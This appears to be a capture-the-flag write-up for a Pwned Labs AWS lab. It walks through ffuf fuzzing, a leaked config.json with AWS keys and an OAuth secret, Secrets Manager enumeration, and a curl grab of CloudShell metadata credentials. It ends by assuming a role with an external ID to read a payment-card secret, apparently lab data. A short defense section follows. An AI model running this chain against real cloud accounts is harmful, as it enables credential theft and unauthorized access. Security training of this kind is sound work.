---
title: Assume Privileged Role with External ID
description: Assume Privileged Role with External ID
image:
  path: aws.jpg
categories:
- Pwned Labs
- AWS
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/aws/
tags:
- pwnedlabs
- aws
- cloud
---
# Scenario
Huge Logistics, a global force in the logistics and shipping industry, has reached out to your firm for a comprehensive security evaluation spanning both their on-premises and cloud setups. Early reconnaissance pointed out the IP address 52.0.51.234 as part of their digital footprint. Your mission is clear: use this IP as your entry point, navigate laterally through their system, and determine potential areas of impact. This isn't just a test of their defenses, but a test of your skill to find weak spots in a vast network. Time to dive in and uncover what lies beneath!

# Walkthrough
We are given IP address. Only port 80 is open, which hosts website

![](assume-privileged-role-with-external-id-1.png)

There's nothing interesting in the source and nothing in the functionality that worth looking. Let's fuzz directories and files. 
```
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt:FUZZ -u http://52.0.51.234/FUZZ -e .conf,.txt,.json,.xml,.yml,.yaml,.env

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://52.0.51.234/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Extensions       : .conf .txt .json .xml .yml .yaml .env 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 191ms]
.html.conf              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 192ms]
.html.xml               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 194ms]
.html.json              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 194ms]
.html.yml               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 192ms]
.html.txt               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 196ms]
.html.yaml              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 194ms]
.html.env               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 194ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 195ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 201ms]
.htm.json               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 232ms]
.htm.xml                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 232ms]
.htm.txt                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 236ms]
.htm                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 237ms]
.htm.yml                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 232ms]
.htm.conf               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 237ms]
.htm.env                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 232ms]
.htm.yaml               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 232ms]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 190ms]
config.json             [Status: 200, Size: 832, Words: 141, Lines: 21, Duration: 213ms]
```

There was nothing interesting in directories, but we found `config.json`, which contains AWS keys.
```
└─$ curl http://52.0.51.234/config.json
{"aws": {
        "accessKeyID": "<REDACTED>",
        "secretAccessKey": "<REDACTED>",
        "region": "us-east-1",
        "bucket": "hl-data-download",
        "endpoint": "https://s3.amazonaws.com"
    },
    "serverSettings": {
        "port": 443,
        "timeout": 18000000
    },
    "oauthSettings": {
        "authorizationURL": "https://auth.hugelogistics.com/ms_oauth/oauth2/endpoints/oauthservice/authorize",
        "tokenURL": "https://auth.hugelogistics.com/ms_oauth/oauth2/endpoints/oauthservice/tokens",
        "clientID": "1012aBcD3456EfGh",
        "clientSecret": "aZ2x9bY4cV6wL8kP0sT7zQ5oR3uH6j",
        "callbackURL": "https://portal.huge-logistics/callback",
        "userProfileURL": "https://portal.huge-logistics.com/ms_oauth/resources/userprofile/me"
    }
}

```

Keys belong to `data-bot` principal
```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAWHEOTHRF7MLFMRGYH",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/data-bot"
}
```

We can check the bucket mentioned in the confing we found, but it contains a lot of transaction files and nothing interesting
```
└─$ aws s3 ls hl-data-download
2023-08-06 03:56:58       5200 LOG-1-TRANSACT.csv
2023-08-06 03:57:05       5200 LOG-10-TRANSACT.csv
2023-08-06 03:58:04       5200 LOG-100-TRANSACT.csv
2023-08-06 03:57:05       5200 LOG-11-TRANSACT.csv
2023-08-06 03:57:06       5200 LOG-12-TRANSACT.csv
<SNIP>
```

Now, we can use [aws-enumerator](https://github.com/shabarkin/aws-enumerator). Authenticate with `aws-enumerator cred`. Then start enumeration
```
└─$ aws-enumerator enum -services all
Message:  Successful APPMESH: 0 / 1
Message:  Successful AMPLIFY: 0 / 1
Message:  Successful APPSYNC: 0 / 1
<SNIP>
Message:  Successful SECRETSMANAGER: 1 / 2
<SNIP>
Message:  Successful STS: 2 / 2
<SNIP>
```

It seems like we have [ListSecrets](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_ListSecrets.html) permission
```
└─$ aws-enumerator dump -services secretsmanager
<SNIP>
ListSecrets
```

We can list the secrets
```
└─$ aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
[
    [
        "employee-database-admin",
        "Admin access to MySQL employee database",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z"
    ],
    [
        "employee-database",
        "Access to MySQL employee database",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-rpkQvl"
    ],
    [
        "ext/cost-optimization",
        "Allow external partner to access cost optimization user and Huge Logistics resources",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4"
    ],
    [
        "billing/hl-default-payment",
        "Access to the default payment card for Huge Logistics",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
    ]
]

```

We couldn't access all secrets, except for `ext/cost-optimization`
```
└─$ aws secretsmanager get-secret-value --secret-id ext/cost-optimization
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
    "Name": "ext/cost-optimization",
    "VersionId": "f7d6ae91-5afd-4a53-93b9-92ee74d8469c",
    "SecretString": "{\"Username\":\"ext-cost-user\",\"Password\":\"<REDACTED>\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1691183968.512
}

```

We can login to aws console using credentials

![](assume-privileged-role-with-external-id-2.png)

We have access to Cloud shell

![](assume-privileged-role-with-external-id-3.png)

We can try to get AWS CLI credentials using this console
```
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
```
```
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```

![](assume-privileged-role-with-external-id-4.png)

After running `aws configure` and setting keys, we also need to set token via `aws configure set aws_session_token "<token>"`
```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAWHEOTHRFTNCWM7FHT",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/ext-cost-user"
}
```

We can't run `aws-enumerator enum -services all`. But we can list policies
```
└─$ aws iam list-attached-user-policies --user-name ext-cost-user
{
    "AttachedPolicies": [
        {
            "PolicyName": "ExtCloudShell",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtCloudShell"
        },
        {
            "PolicyName": "ExtPolicyTest",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtPolicyTest"
        }
    ]
}
     
```

We have `ExtCloudShell` and `ExtPolicyTest` policies. Let's check `ExtPolicyTest` 
```
└─$ aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest
{
    "Policy": {
        "PolicyName": "ExtPolicyTest",
        "PolicyId": "ANPAWHEOTHRF7772VGA5J",
        "Arn": "arn:aws:iam::427648302155:policy/ExtPolicyTest",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T21:47:26Z",
        "UpdateDate": "2023-08-06T20:23:42Z",
        "Tags": []
    }
}

```

Let's pull the latest version. Seems like we have role named `ExternalCostOpimizeAccess` and our user has permissions to list and view policies for defined in `Resource` section objects
```
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:policy/ExtPolicyTest",
                        "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
                        "arn:aws:iam::427648302155:policy/Payment",
                        "arn:aws:iam::427648302155:user/ext-cost-user"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-06T20:23:42Z"
    }
}

```

Let's check `ExternalCostOpimizeAccess` role, which we can assume using current user
```
└─$ aws iam get-role --role-name ExternalCostOpimizeAccess
{
    "Role": {
        "Path": "/",
        "RoleName": "ExternalCostOpimizeAccess",
        "RoleId": "AROAWHEOTHRFZP3NQR7WN",
        "Arn": "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
        "CreateDate": "2023-08-04T21:09:30Z",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::427648302155:user/ext-cost-user"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": "37911"
                        }
                    }
                }
            ]
        },
        "Description": "Allow trusted AWS cost optimization partner to access Huge Logistics resources",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2025-08-23T06:16:45Z",
            "Region": "us-east-1"
        }
    }
}

```

If we list policies attached to the role, we find `Payment` policy
```
└─$ aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess
{
    "AttachedPolicies": [
        {
            "PolicyName": "Payment",
            "PolicyArn": "arn:aws:iam::427648302155:policy/Payment"
        }
    ]
}

```

There are 2 versions of the policy
```
└─$ aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Payment
{
    "Policy": {
        "PolicyName": "Payment",
        "PolicyId": "ANPAWHEOTHRFZCZIMJSVW",
        "Arn": "arn:aws:iam::427648302155:policy/Payment",
        "Path": "/",
        "DefaultVersionId": "v2",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T22:03:41Z",
        "UpdateDate": "2023-08-04T22:34:19Z",
        "Tags": []
    }
}

```

Let's pull the latest one
```
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Payment --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "secretsmanager:GetSecretValue",
                        "secretsmanager:DescribeSecret",
                        "secretsmanager:ListSecretVersionIds"
                    ],
                    "Resource": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "secretsmanager:ListSecrets",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-04T22:34:19Z"
    }
}

```

Let's assume the role (we have to set `--external-id 37911` since it was defined in the role policy)
```
└─$ aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911
{
    "Credentials": {
        "AccessKeyId": "<REDACTED>",
        "SecretAccessKey": "<REDACTED>",
        "SessionToken": "<REDACTED>",
        "Expiration": "2025-08-26T18:48:31Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAWHEOTHRFZP3NQR7WN:ExternalCostOpimizeAccess",
        "Arn": "arn:aws:sts::427648302155:assumed-role/ExternalCostOpimizeAccess/ExternalCostOpimizeAccess"
    }
}

```

After setting the keys and session token we can confirm that we have successfully assumed the role
```
└─$ aws sts get-caller-identity
{
    "UserId": "AROAWHEOTHRFZP3NQR7WN:ExternalCostOpimizeAccess",
    "Account": "427648302155",
    "Arn": "arn:aws:sts::427648302155:assumed-role/ExternalCostOpimizeAccess/ExternalCostOpimizeAccess"
}

```

Let's get payment details that we saw above
```
└─$ aws secretsmanager get-secret-value --secret-id billing/hl-default-payment
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
    "Name": "billing/hl-default-payment",
    "VersionId": "f8e592ca-4d8a-4a85-b7fa-7059539192c5",
    "SecretString": "{\"Card Brand\":\"VISA\",\"Card Number\":\"4180-5677-2810-4227\",\"Holder Name\":\"Michael Hayes\",\"CVV/CVV2\":\"839\",\"Card Expiry\":\"5/2026\",\"Flag\":\"<REDACTED>\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1691188419.867
}

```
# Defense
This part is from [lab's defense section](https://pwnedlabs.io/labs/assume-privileged-role-with-external-id)

It's recommended to store configuration files outside of the world-readable web root. Even if there are no links to the file in the web root, it's likely only a matter of time before discovers it'

Make sure to review the policies and test them. In this case, there is no need for `data-bot` IAM user to have access to the `ext-cost-user` IAM user used by the third party cost-optimization partner. 